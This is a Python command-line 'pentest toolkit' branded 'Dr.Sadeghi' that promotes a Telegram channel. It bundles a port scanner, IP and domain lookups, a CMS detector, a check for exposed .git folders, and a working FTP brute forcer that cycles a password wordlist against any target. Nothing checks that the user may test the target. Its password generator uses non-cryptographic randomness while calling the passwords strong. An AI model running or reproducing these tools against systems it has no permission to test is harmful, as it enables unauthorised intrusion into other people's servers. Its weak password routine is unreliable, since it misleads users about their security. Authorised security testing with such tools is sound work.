import os
import sys
import subprocess

# === Auto-install required packages if missing ===
required_packages = ["rich", "pyfiglet", "requests"]

def install_and_import(pkg):
    try:
        __import__(pkg)
    except ImportError:
        print(f"Package '{pkg}' not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
    finally:
        globals()[pkg] = __import__(pkg)

for package in required_packages:
    install_and_import(package)

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.markdown import Markdown
from rich.text import Text
from pyfiglet import Figlet
import socket
import requests
import random
import string
from ftplib import FTP, error_perm

console = Console()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    f = Figlet(font="slant")
    ascii_art = f.renderText("Dr.Sadeghi")
    console.print(f"[bold red]{ascii_art}[/bold red]", justify="center")
    console.print(
        Panel(
            "[bold cyan]🔍 Professional Pentest Toolkit by [link=https://t.me/Mr_sequrityy]@Mr_sequrityy[/link][/bold cyan]",
            style="bold magenta",
            expand=False,
            padding=(1, 6),
            border_style="bright_blue"
        ),
        justify="center",
    )

def show_menu():
    table = Table(title="🛠️ Available Tools", show_lines=True, box=None)
    table.add_column("ID", justify="center", style="cyan", no_wrap=True)
    table.add_column("Tool Name", style="bold green")
    table.add_column("Description", style="yellow")
    
    tools = [
        ("1", "Port Scanner", "Scan common open ports on a target"),
        ("2", "IP Geolocation", "Get detailed location info of an IP or domain"),
        ("3", "FTP Login Brute Force", "Test FTP login with username/password list"),
        ("4", "CMS Detector", "Detect CMS type of a website"),
        ("5", "Basic Vulnerability Scanner", "Check for accessible .git folder"),
        ("6", "Phishing Link Guide", "Educational phishing link guide"),
        ("7", "Password Generator", "Generate strong random passwords"),
        ("8", "Domain Information", "Get IP and info for a domain"),
        ("9", "Help", "Show usage help and info"),
        ("0", "Exit", "Exit the toolkit"),
    ]
    
    for id, name, desc in tools:
        table.add_row(id, name, desc)
    console.print(table)

def port_scanner():
    target = console.input("[bold green]🔹 Enter target IP or domain: [/bold green]").strip()
    if not target:
        console.print("[red]Input cannot be empty! Returning to menu.[/red]")
        return
    console.print("[yellow]Scanning common ports... (This might take a moment)[/yellow]")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080]
    open_ports = []
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.7)
        try:
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
        except Exception:
            pass
        finally:
            sock.close()
    if open_ports:
        console.print(f"[green]Open ports on {target}:[/green] {', '.join(map(str, open_ports))}")
    else:
        console.print(f"[yellow]No common ports found open on {target}.[/yellow]")

def ip_geolocation():
    ip = console.input("[bold green]🔹 Enter IP address or domain: [/bold green]").strip()
    if not ip:
        console.print("[red]Input cannot be empty! Returning to menu.[/red]")
        return
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=7)
        r.raise_for_status()
        data = r.json()
        console.print(Panel.fit("[bold green]IP Geolocation Result[/bold green]", style="bold blue"))
        for key, value in data.items():
            console.print(f"[cyan]{key}[/cyan]: {value}")
    except Exception as e:
        console.print(f"[red]Failed to get IP info: {e}[/red]")

def ftp_brute_force():
    console.print(Panel("[bold yellow]🧪 FTP Brute Force Attack[/bold yellow]", border_style="yellow"))
    target = console.input("[bold green]🔹 Enter FTP Server IP or domain: [/bold green]").strip()
    if not target:
        console.print("[red]Input cannot be empty! Returning to menu.[/red]")
        return

    username = console.input("[bold green]🔹 Enter FTP username: [/bold green]").strip()
    if not username:
        console.print("[red]Username cannot be empty! Returning to menu.[/red]")
        return

    passlist_path = console.input("[bold green]🔹 Enter password list file path: [/bold green]").strip()
    if not passlist_path or not os.path.isfile(passlist_path):
        console.print("[red]Invalid file path! Returning to menu.[/red]")
        return

    console.print(f"[yellow]Starting brute force on {target} with user '{username}'...[/yellow]")
    try:
        with open(passlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.read().splitlines()
    except Exception as e:
        console.print(f"[red]Failed to read password list: {e}[/red]")
        return

    success = False
    for idx, pwd in enumerate(passwords, 1):
        pwd = pwd.strip()
        if not pwd:
            continue
        try:
            ftp = FTP(timeout=5)
            ftp.connect(target, 21)
            ftp.login(username, pwd)
            console.print(Panel(f"[green]Success! Username: '{username}' Password: '{pwd}'[/green]", border_style="green"))
            ftp.quit()
            success = True
            break
        except error_perm:
            console.print(f"[red]Attempt {idx}: Failed password '{pwd}'[/red]", end="\r")
        except Exception as e:
            console.print(f"[red]Error connecting: {e}[/red]")
            break
    if not success:
        console.print("[red]Brute force finished. No valid password found.[/red]")

def cms_detector():
    url = console.input("[bold green]🔹 Enter website URL (with http/https): [/bold green]").strip()
    if not url:
        console.print("[red]Input cannot be empty! Returning to menu.[/red]")
        return
    try:
        r = requests.get(url, timeout=7)
        html = r.text.lower()
        cms = "Unknown / Not detected"
        if "wp-content" in html:
            cms = "WordPress"
        elif "joomla" in html:
            cms = "Joomla"
        elif "drupal" in html:
            cms = "Drupal"
        console.print(Panel(f"[blue]CMS detected:[/] {cms}", border_style="blue"))
    except Exception as e:
        console.print(f"[red]CMS detection failed: {e}[/red]")

def vulnerability_scanner():
    url = console.input("[bold green]🔹 Enter website URL: [/bold green]").strip()
    if not url:
        console.print("[red]Input cannot be empty! Returning to menu.[/red]")
        return
    try:
        r = requests.get(url.rstrip("/") + "/.git", timeout=7)
        if r.status_code == 200:
            console.print(Panel("[red]⚠️ .git directory is publicly accessible![/red]", border_style="red"))
        else:
            console.print(Panel("[green]✅ .git directory is not accessible.[/green]", border_style="green"))
    except Exception as e:
        console.print(f"[red]Vulnerability scan failed: {e}[/red]")

def phishing_guide():
    help_text = """
# Phishing Link Creation Guide (Educational Purposes Only)

- Never use phishing for illegal or unethical purposes.
- Use phishing simulations only in controlled environments.
- Refer to official security training resources.
- Join [Mr_sequrityy Telegram Channel](https://t.me/Mr_sequrityy) for tutorials and updates.

Stay ethical and responsible!
"""
    console.print(Markdown(help_text))

def password_generator():
    length_str = console.input("[bold green]🔹 Enter password length (e.g. 16): [/bold green]").strip()
    if not length_str.isdigit() or int(length_str) <= 0:
        console.print("[red]Invalid input! Please enter a positive number.[/red]")
        return
    length = int(length_str)
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(chars) for _ in range(length))
    console.print(Panel(f"[cyan]Generated password:[/] {password}", border_style="cyan"))

def domain_info():
    domain = console.input("[bold green]🔹 Enter domain: [/bold green]").strip()
    if not domain:
        console.print("[red]Input cannot be empty! Returning to menu.[/red]")
        return
    try:
        ip = socket.gethostbyname(domain)
        console.print(Panel(f"[blue]IP:[/] {ip}", border_style="blue"))
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=7)
        data = r.json()
        for key, value in data.items():
            console.print(f"[cyan]{key}[/cyan]: {value}")
    except Exception as e:
        console.print(f"[red]Failed to retrieve domain info: {e}[/red]")

def help_section():
    help_md = """
# Dr.Sadeghi Toolkit - Help & Info

Welcome to the professional penetration testing toolkit.

**Tools available:**

1. Port Scanner - Scan for open ports on a target host.
2. IP Geolocation - Get detailed info about an IP or domain.
3. FTP Brute Force - Test FTP login with username/password list.
4. CMS Detector - Detect common CMS systems on websites.
5. Vulnerability Scanner - Check if .git folder is publicly accessible.
6. Phishing Guide - Educational resource on phishing.
7. Password Generator - Generate strong random passwords.
8. Domain Info - Retrieve domain's IP and related info.
0. Exit - Quit the toolkit.

**Usage Notes:**

- Enter inputs carefully when prompted.
- Network tools require internet connection.
- Use this toolkit responsibly and ethically.
- For tutorials and support, visit: [https://t.me/Mr_sequrityy](https://t.me/Mr_sequrityy)

Stay safe & ethical hacking!
"""
    console.print(Markdown(help_md))

def main():
    clear_screen()
    banner()
    while True:
        show_menu()
        choice = console.input("\n[bold magenta]📥 Enter your choice: [/bold magenta]").strip()
        if choice == "1":
            port_scanner()
        elif choice == "2":
            ip_geolocation()
        elif choice == "3":
            ftp_brute_force()
        elif choice == "4":
            cms_detector()
        elif choice == "5":
            vulnerability_scanner()
        elif choice == "6":
            phishing_guide()
        elif choice == "7":
            password_generator()
        elif choice == "8":
            domain_info()
        elif choice == "9":
            help_section()
        elif choice == "0":
            console.print("\n[bold red]❌ Exiting... Goodbye Dr.Sadeghi[/bold red]")
            break
        else:
            console.print("[red]Invalid choice! Please select a valid option.[/red]")
        console.print("\n[bold yellow]Press Enter to continue...[/bold yellow]")
        input()
        clear_screen()
        banner()

if __name__ == "__main__":
    main()
